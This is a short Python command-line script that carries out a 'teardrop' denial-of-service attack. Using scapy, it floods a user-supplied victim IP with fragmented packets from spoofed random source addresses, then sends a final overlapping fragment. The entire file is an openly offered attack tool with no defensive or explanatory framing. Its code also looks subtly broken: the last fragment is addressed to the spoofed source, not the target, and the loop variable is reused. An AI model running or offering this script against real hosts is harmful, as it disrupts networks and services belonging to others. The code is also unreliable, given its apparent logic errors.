import click


@click.command("teardrop", help="Teardrop attack")
@click.option("--target", prompt="victim IP addr", help="victim to attack.")
@click.option("--ddos", default=True, help="enable ddos simulate")
@click.option("--num", default=2000, help="number of packet, default = 2000")
@click.option("--payload", default=36, help="size of payload")
def teardrop(target, ddos, num, payload):
    from scapy.all import send, IP, RandIP

    src = RandIP() if ddos else RandIP()._fix()
    offset = 10
    load = "A" * payload
    sended = 0
    for i in range(num - 1):
        i = IP()
        i.src = src
        i.dst = target
        i.flags = "MF"
        i.proto = 17
        send(i / load, verbose=False)
        sended += 1

    j = IP()
    j.dst = src
    j.flags = 0
    j.proto = 17
    j.frag = offset
    send(j / load, verbose=False)
    sended += 1

    print("Done!, Flushed %d packets" % (sended))


if __name__ == "__main__":
    teardrop()
